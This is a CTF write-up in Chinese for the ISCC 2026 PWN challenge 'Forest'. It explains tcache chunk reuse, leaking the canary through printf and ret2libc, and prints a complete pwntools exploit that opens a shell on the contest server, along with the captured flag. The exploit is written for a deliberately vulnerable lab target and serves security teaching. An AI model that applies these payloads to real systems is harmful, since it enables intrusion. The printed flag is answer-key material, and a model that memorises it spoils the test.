# Forest

> **Category**: PWN | **Difficulty**: Medium | **Competition**: ISCC 2026 决赛
> **Flag**: `ISCC{9f88d97a-09b8-4e21-ad9f-9948b3a997c2}`

---

## Attack Chain

```
堆块重用绕过lock_one → printf泄露Canary → ROP泄露libc基址 → ret2libc获取shell
```

## Key Techniques

### 1. 堆块重用绕过验证
`forest_lock_one`中`malloc(0x64)`写入"magic"后free，再请求size=100时tcache返回同一块内存，写入"magic"后strncmp匹配通过。第二关lock_two检查key==0x7ea后直接跳过。

### 2. printf泄露Canary
buf在rbp-0x20，Canary在rbp-0x8，相距24字节。发送25字节覆盖Canary的null byte，printf的%s输出越过终止符泄露剩余7字节。

### 3. ret2libc
无PIE，ROP调用`puts(puts@GOT)`泄露libc地址后返回main，第二轮溢出调用`system("/bin/sh")`。

## Exploit

```python
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

# Binary addresses (No PIE)
pop_rdi     = 0x401763
ret_gadget  = 0x40101a
puts_plt    = 0x401060
puts_got    = 0x404030
main_addr   = 0x4015c6

SUFFIX = b' ... A curious gift indeed.\n'

# Identified libc: libc6_2.23-0ubuntu11.3_amd64
PUTS_OFF = 0x6f6a0
SYS_OFF  = 0x453a0
BINSH_OFF = 0x18ce57

def exploit():
    p = remote('39.96.193.120', 10001)

    # ========== Stage 1: Pass forest_lock_one ==========
    # 堆块重用：malloc(0x64) free 后，再 malloc(100) 拿到同一块内存
    # 写入 "magic"，strncmp(旧指针, "magic", 5) 通过
    log.info('Stage 1: Passing forest_lock_one...')
    p.recvuntil(b"wizard's note:")
    p.sendline(b'100')
    p.recvuntil(b'rune sheet!')
    p.sendline(b'magic')

    # lock_two 检查 key==0x7ea 后直接跳过，无需猜随机数

    # ========== Stage 2: Leak canary ==========
    # buf 在 rbp-0x20, canary 在 rbp-0x8
    # 发送 25 字节覆盖 canary 的 null byte, printf 泄露剩余 7 字节
    log.info('Stage 2: Leaking canary...')
    p.recvuntil(b'sacrifice?\n')
    p.send(b'B' * 24 + b'C')
    output = p.recvuntil(SUFFIX)

    before_suffix = output[:-len(SUFFIX)]
    canary_leaked = before_suffix[25:]

    if len(canary_leaked) < 7:
        log.warning('Canary leak too short, retrying...')
        p.close()
        return False

    canary = b'\x00' + canary_leaked[:7]
    log.success(f'Canary: {hex(u64(canary))}')

    # ========== Stage 3: ROP to leak puts@libc ==========
    log.info('Stage 3: Leaking puts@libc...')
    payload  = b'A' * 24 + canary + p64(0)
    payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
    payload += p64(main_addr)
    p.send(payload)

    p.recvuntil(b'warmth.\n')
    leaked_line = p.recvuntil(b'\n', drop=True)

    if len(leaked_line) < 6:
        log.warning('Leak truncated, retrying...')
        p.close()
        return False

    puts_leak = u64(leaked_line.ljust(8, b'\x00'))
    log.success(f'puts@libc: {hex(puts_leak)}')

    # ========== Stage 4: Compute libc addresses ==========
    libc_base = puts_leak - PUTS_OFF
    system_addr = libc_base + SYS_OFF
    binsh_addr = libc_base + BINSH_OFF

    log.info(f'libc_base: {hex(libc_base)}')
    log.info(f'system:    {hex(system_addr)}')
    log.info(f'/bin/sh:   {hex(binsh_addr)}')

    # ========== Stage 5: Round 2 - Get shell ==========
    log.info('Stage 5: Spawning shell...')
    p.recvuntil(b'sacrifice?\n')

    p.send(b'X' * 24)
    p.recvuntil(SUFFIX, timeout=5)

    # ROP: system("/bin/sh")
    payload  = b'X' * 24 + canary + p64(0)
    payload += p64(pop_rdi)
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    p.send(payload)

    p.recvuntil(b'warmth.\n', timeout=3)
    time.sleep(0.5)

    p.sendline(b'cat flag*')
    p.interactive()
    return True

for attempt in range(5):
    log.info(f'=== Attempt {attempt+1} ===')
    try:
        if exploit():
            break
    except Exception as e:
        log.error(f'Error: {e}')
        time.sleep(1)
```

**运行结果：**

```
Flag: ISCC{9f88d97a-09b8-4e21-ad9f-9948b3a997c2}
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| 堆块重用 | tcache bin中同size的malloc返回刚free的同一块内存 |
| Canary泄露 | printf %s覆盖null byte后泄露栈上Canary剩余7字节 |
| ret2libc | 无PIE时GOT/PLT地址固定，puts泄露libc后调用system |
| libc版本识别 | 通过libc.rip查询函数偏移末三位交叉验证 |
| 二段式溢出 | 第一轮泄露，返回main后第二轮getshell |

---

*Original writeup: `C:\Users\48714\Desktop\wp\final\forest_WriteUp.md`*
